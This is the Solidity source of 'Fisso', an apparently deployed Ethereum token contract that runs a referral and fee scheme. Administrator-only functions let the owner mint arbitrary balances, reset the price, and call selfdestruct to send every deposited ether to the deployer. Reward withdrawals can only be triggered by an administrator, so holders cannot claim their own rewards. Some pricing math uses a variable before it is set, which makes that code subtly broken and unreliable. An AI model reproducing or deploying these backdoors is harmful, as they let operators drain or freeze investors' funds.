/**
 *Submitted for verification at Etherscan.io on 2020-10-20
*/

pragma solidity ^0.4.26;

contract Fisso {
    modifier onlyBagholders() {
        require(myTokens() > 0);
        _;
    }

    modifier onlyAdministrator(){
        address _customerAddress = msg.sender;
        require(administrators[_customerAddress]);
        _;
    }
   
    /*==============================
    =            EVENTS            =
    ==============================*/
    event onTokenPurchase(
        address indexed customerAddress,
        uint256 incomingEthereum,
        uint256 tokensMinted,
        uint256 totalSupply,
        address indexed referredBy
    );
   
    event onTokenSell(
        address indexed customerAddress,
        uint256 tokensBurned,
        uint256 ethereumEarned
    );
   
    event onReinvestment(
        address indexed customerAddress,
        uint256 ethereumReinvested,
        uint256 tokensMinted
    );
   
    event onWithdraw(
        address indexed customerAddress,
        uint256 ethereumWithdrawn
    );
   
    // ERC20
    event Transfer(
        address indexed from,
        address indexed to,
        uint256 tokens
    );
   
   
    /*=====================================
    =            CONFIGURABLES            =
    =====================================*/
    string public name = "Fisso";
    string public symbol = "FISSO";
    uint256 constant public totalSupply_ = 50000000;
    uint8 constant public decimals = 0;
    uint256 constant internal tokenPriceInitial_ = 27027027;
    uint256 constant internal tokenPriceIncremental_ = 216216;
    uint256 public percent = 350;
    uint256 public currentPrice_ = tokenPriceInitial_ + tokenPriceIncremental_;
    uint256 public communityFunds = 0;
    address dev1; //management fees
    address dev2; //development and progress account
    address dev3; //marketing expenditure
    address dev4; //running cost and other expenses
   
   /*================================
    =            DATASETS            =
    ================================*/
    mapping(address => uint256) internal tokenBalanceLedger_;
    mapping(address => uint256) internal rewardBalanceLedger_;
    address[] public holders_ = new address[](0);
    address sonk;
    uint256 internal tokenSupply_ = 0;
    mapping(address => bool) public administrators;
    mapping(address => address) public genTree;
   
    constructor() public
    {
        sonk = msg.sender;
        administrators[sonk] = true;
    }
   
    function upgradeContract(address[] _users, uint256[] _balances, uint256[] _rewardBalances, address[] _refers, uint modeType)
    onlyAdministrator()
    public
    {
        if(modeType == 1)
        {
            for(uint i = 0; i<_users.length;i++)
            {
                 genTree[_users[i]] = _refers[i];
                if(_balances[i] > 0)
                {
                    tokenBalanceLedger_[_users[i]] += _balances[i];
                    rewardBalanceLedger_[_users[i]] += _rewardBalances[i];
                    tokenSupply_ += _balances[i];
                    holders_.push(_users[i]);
                    emit Transfer(address(this),_users[i],_balances[i]);
                }
            }
        }
        if(modeType == 2)
        {
            for(i = 0; i<_users.length;i++)
            {
                rewardBalanceLedger_[_users[i]] += _balances[i];
            }
        }
    }
    
    function upgradeDetails(uint256 _currentPrice, uint256 _commFunds)
    onlyAdministrator()
    public
    {
        currentPrice_ = _currentPrice;
        communityFunds = _commFunds;
    }
    
    function fundsInjection() public payable returns(bool)
    {
        return true;
    }
   
    function buy(address _referredBy)
        public
        payable
        returns(uint256)
    {
        genTree[msg.sender] = _referredBy;
        purchaseTokens(msg.value, _referredBy);
    }
   
    function()
        payable
        public
    {
        purchaseTokens(msg.value, 0x0);
    }
   
    function withdrawRewards(address customerAddress_)
        onlyAdministrator()
        public
    {
        if(rewardBalanceLedger_[customerAddress_]>5000000000000000)
        {
            uint256 toSend_ = SafeMath.sub(rewardBalanceLedger_[customerAddress_],5000000000000000);
            rewardBalanceLedger_[customerAddress_] = 0;
            customerAddress_.transfer(toSend_);
        }
    }
   
    function reInvest()
        public
        returns(uint256)
    {
        address customerAddress_ = msg.sender;
        require(rewardBalanceLedger_[customerAddress_] >= (currentPrice_*2), 'Your rewards are too low yet');
        uint256 tokensBought_ = purchaseTokens(rewardBalanceLedger_[customerAddress_], genTree[msg.sender]);
        rewardBalanceLedger_[customerAddress_] = 0;
        return tokensBought_;
    }
   
    function distributeRewards(uint256 amountToDistribute)
    public
    onlyAdministrator()
    {
        if(communityFunds >= amountToDistribute)
        {
            for(uint i = 0; i<holders_.length;i++)
            {
                uint256 _balance = tokenBalanceLedger_[holders_[i]];
                if(_balance>0)
                {
                    rewardBalanceLedger_[holders_[i]] += ((_balance*10000000/tokenSupply_)*(amountToDistribute))/10000000;
                }
            }
            communityFunds -= amountToDistribute;
        }
    }

    /**
     * Liquifies tokens to ethereum.
     */
    function sell(uint256 _amountOfTokens)
        onlyBagholders()
        public
    {
        // setup data
        address _customerAddress = msg.sender;
        require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
        uint256 _tokens = _amountOfTokens;
        uint256 _ethereum = tokensToEthereum_(_tokens,true);
        uint256 _dividends = _ethereum * 2200/10000;
        uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
        uint256 rewardsToDistribute = (_dividends*10)/176;
        rewardBalanceLedger_[dev1] += rewardsToDistribute*2;
        rewardBalanceLedger_[dev2] += rewardsToDistribute*2;
        rewardBalanceLedger_[dev3] += rewardsToDistribute*2;
        rewardBalanceLedger_[dev4] += rewardsToDistribute*2;
        communityFunds += rewardsToDistribute * 8;
        rewardBalanceLedger_[feeHolder_] += _dividends-(16*rewardsToDistribute);
        // fire event
        emit Transfer(_customerAddress,address(this), _amountOfTokens);
        // burn the sold tokens
        tokenSupply_ = SafeMath.sub(tokenSupply_, _tokens);
        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);
        _customerAddress.transfer(_taxedEthereum);
    }
    address feeHolder_;
    function registerDev234(address _devAddress1, address _devAddress2, address _devAddress3,address _devAddress4,address _feeHolder)
    onlyAdministrator()
    public
    {
        dev1 = _devAddress1;
        dev2 = _devAddress2;
        dev3 = _devAddress3;
        dev4 = _devAddress4;
        feeHolder_ = _feeHolder;
        administrators[feeHolder_] = true;
    }
   
    function transfer(address _toAddress, uint256 _amountOfTokens)
        public
        returns(bool)
    {
        // setup
        address _customerAddress = msg.sender;
        uint256 _tokenFee = _amountOfTokens * 10/100;
        uint256 _taxedTokens = SafeMath.sub(_amountOfTokens, _tokenFee);
        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
        tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], _taxedTokens);
        emit Transfer(_customerAddress, _toAddress, _taxedTokens);
        return true;
       
    }
   
    function destruct() onlyAdministrator() public{
        selfdestruct(sonk);
    }
   
    function setPercent(uint256 newPercent) onlyAdministrator() public {
        percent = newPercent * 10;
    }
   
    function setName(string _name)
        onlyAdministrator()
        public
    {
        name = _name;
    }
   
    function setSymbol(string _symbol)
        onlyAdministrator()
        public
    {
        symbol = _symbol;
    }

    function totalEthereumBalance()
        public
        view
        returns(uint)
    {
        return address(this).balance;
    }
   
    function totalSupply()
        public
        pure
        returns(uint256)
    {
        return totalSupply_;
    }
    
    function tokenSupply()
        public
        view
        returns(uint256)
    {
        return tokenSupply_;
    }
   
    function getCommunityFunds()
    public
    view
    returns(uint256)
    {
        return communityFunds;
    }
   
    /**
     * Retrieve the tokens owned by the caller.
     */
    function myTokens()
        public
        view
        returns(uint256)
    {
        address _customerAddress = msg.sender;
        return balanceOf(_customerAddress);
    }
   
    /**
     * Retrieve the token balance of any single address.
     */
    function balanceOf(address _customerAddress)
        view
        public
        returns(uint256)
    {
        return tokenBalanceLedger_[_customerAddress];
    }
   
    //check the ethereum reward balance
     function rewardOf(address _customerAddress)
        view
        public
        returns(uint256)
    {
        return rewardBalanceLedger_[_customerAddress];
    }

    function sellPrice()
        public
        view
        returns(uint256)
    {
        // our calculation relies on the token supply, so we need supply. Doh.
        if(tokenSupply_ == 0){
            return tokenPriceInitial_ - tokenPriceIncremental_;
        } else {
            uint256 _ethereum = tokensToEthereum_(2,false);
            uint256 _dividends = _ethereum * 2200/10000;
            uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
            return _taxedEthereum;
        }
    }
   
    /**
     * Return the sell price of 1 individual token.
     */
    function buyPrice()
        public
        view
        returns(uint256)
    {
        return currentPrice_;
    }
   
    function calculateEthereumReceived(uint256 _tokensToSell)
        public
        view
        returns(uint256)
    {
        require(_tokensToSell <= tokenSupply_);
        uint256 _ethereum = tokensToEthereum_(_tokensToSell,false);
        uint256 _dividends = _ethereum * 2200/10000;
        uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
        return _taxedEthereum;
    }
   
    /*==========================================
    =            INTERNAL FUNCTIONS            =
    ==========================================*/
   
    event testLog(
        uint256 currBal
    );
    function calculateTokensReceived(uint256 _ethereumToSpend)
        public
        view
        returns(uint256)
    {
        uint256 _dividends = _ethereumToSpend * percent/1000;
        uint256 _taxedEthereum = SafeMath.sub(_ethereumToSpend, _dividends);
        uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum, currentPrice_, false);
        return _amountOfTokens;
    }
   
    function purchaseTokens(uint256 _incomingEthereum, address _referredBy)
        internal
        returns(uint256)
    {
        // data setup
        address _customerAddress = msg.sender;
        uint256 _dividends = _incomingEthereum * percent/1000;
        uint256 _taxedEthereum = SafeMath.sub(_incomingEthereum, _dividends);
        uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum , currentPrice_, true);
        require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_));
        tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);
        tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
        if(tokenBalanceLedger_[_customerAddress] == _amountOfTokens)
        {
            holders_.push(_customerAddress);
        }
        uint256 rewardsToDistribute = (_dividends * 100) / 750;
        communityFunds += rewardsToDistribute * 2;
        rewardBalanceLedger_[_referredBy] += rewardsToDistribute * 3;
        _dividends -= 7*rewardsToDistribute;
        rewardBalanceLedger_[feeHolder_] = _dividends;
        rewardsToDistribute = 2 * rewardsToDistribute;
        rewardBalanceLedger_[dev1] = rewardBalanceLedger_[dev1]+(rewardsToDistribute*250/1000);
        rewardBalanceLedger_[dev2] = rewardBalanceLedger_[dev2]+(rewardsToDistribute*250/1000);
        rewardBalanceLedger_[dev3] = rewardBalanceLedger_[dev3]+(rewardsToDistribute*250/1000);
        rewardBalanceLedger_[dev4] = rewardBalanceLedger_[dev4]+(rewardsToDistribute*250/1000);
        require(SafeMath.add(_amountOfTokens,tokenSupply_) <= totalSupply_);
        // fire event
        emit Transfer(address(this),_customerAddress, _amountOfTokens);
        return _amountOfTokens;
    }
   
    function ethereumToTokens_(uint256 _ethereum, uint256 _currentPrice, bool buy_)
        internal
        view
        returns(uint256)
    {
        uint256 _tempad = SafeMath.sub((2*_currentPrice), _tokenPriceIncremental);
        uint256 _tokenSupply = tokenSupply_;
        uint256 _tokenPriceIncremental = (tokenPriceIncremental_*(3**(_tokenSupply/5000000)));
        uint256 _totalTokens = 0;
        uint256 _tokensReceived = (
            (
                SafeMath.sub(
                    (sqrt
                        (
                            _tempad**2
                            + (8*_tokenPriceIncremental*_ethereum)
                        )
                    ), _tempad
                )
            )/(2*_tokenPriceIncremental)
        );
        uint256 tempbase = ((_tokenSupply/5000000)+1)*5000000;
        while((_tokensReceived + _tokenSupply) > tempbase){
            _tokensReceived = tempbase - _tokenSupply;
            _ethereum = SafeMath.sub(
                _ethereum,
                ((_tokensReceived)/2)*
                ((2*_currentPrice)+((_tokensReceived-1)
                *_tokenPriceIncremental))
            );
            _currentPrice = _currentPrice+((_tokensReceived-1)*_tokenPriceIncremental);
            _tokenPriceIncremental = (tokenPriceIncremental_*((3)**((_tokensReceived + _tokenSupply)/5000000)));
            _tempad = SafeMath.sub((2*_currentPrice), _tokenPriceIncremental);
            uint256 _tempTokensReceived = (
                (
                    SafeMath.sub(
                        (sqrt
                            (
                                _tempad**2
                                + (8*_tokenPriceIncremental*_ethereum)
                            )
                        ), _tempad
                    )
                )/(2*_tokenPriceIncremental)
            );
            _tokenSupply = _tokenSupply + _tokensReceived;
            _totalTokens = _totalTokens + _tokensReceived;
            _tokensReceived = _tempTokensReceived;
            tempbase = ((_tokenSupply/5000000)+1)*5000000;
        }
        _totalTokens = _totalTokens + _tokensReceived;
        _currentPrice = _currentPrice+((_tokensReceived-1)*_tokenPriceIncremental);
        if(buy_ == true)
        {
            currentPrice_ = _currentPrice;
        }
        return _totalTokens;
    }
   
     function tokensToEthereum_(uint256 _tokens, bool sell_)
        internal
        view
        returns(uint256)
    {
        uint256 _tokenSupply = tokenSupply_;
        uint256 _etherReceived = 0;
        uint256 tempbase = ((_tokenSupply/5000000))*5000000;
        uint256 _currentPrice = currentPrice_;
        uint256 _tokenPriceIncremental = (tokenPriceIncremental_*((3)**(_tokenSupply/5000000)));
        while((_tokenSupply - _tokens) < tempbase)
        {
            uint256 tokensToSell = _tokenSupply - tempbase;
            if(tokensToSell == 0)
            {
                _tokenSupply = _tokenSupply - 1;
                tempbase = ((_tokenSupply/5000000))*5000000;
                continue;
            }
            uint256 b = ((tokensToSell-1)*_tokenPriceIncremental);
            uint256 a = _currentPrice - b;
            _tokens = _tokens - tokensToSell;
            _etherReceived = _etherReceived + ((tokensToSell/2)*((2*a)+b));
            _currentPrice = a;
            _tokenSupply = _tokenSupply - tokensToSell;
            _tokenPriceIncremental = (tokenPriceIncremental_*((3)**((_tokenSupply-1)/5000000)));
            tempbase = (((_tokenSupply-1)/5000000))*5000000;
        }
        if(_tokens > 0)
        {
             a = _currentPrice - ((_tokens-1)*_tokenPriceIncremental);
             _etherReceived = _etherReceived + ((_tokens/2)*((2*a)+((_tokens-1)*_tokenPriceIncremental)));
             _tokenSupply = _tokenSupply - _tokens;
             _currentPrice = a;
        }
        if(sell_ == true)
        {
            currentPrice_ = _currentPrice;
        }
        return _etherReceived;
    }
   
   
    function sqrt(uint x) internal pure returns (uint y) {
        uint z = (x + 1) / 2;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }
}

/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {

    /**
    * @dev Multiplies two numbers, throws on overflow.
    */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    /**
    * @dev Integer division of two numbers, truncating the quotient.
    */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    /**
    * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    /**
    * @dev Adds two numbers, throws on overflow.
    */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}